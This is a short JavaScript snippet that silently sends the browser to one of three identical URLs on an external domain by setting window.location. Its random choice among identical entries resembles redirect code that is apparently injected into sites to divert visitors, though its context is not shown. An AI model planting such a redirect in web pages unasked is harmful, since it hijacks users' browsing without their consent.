var dataUrl = [

'https://jarthreads.brandballia.com/threads',
'https://jarthreads.brandballia.com/threads',
'https://jarthreads.brandballia.com/threads'

];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem;
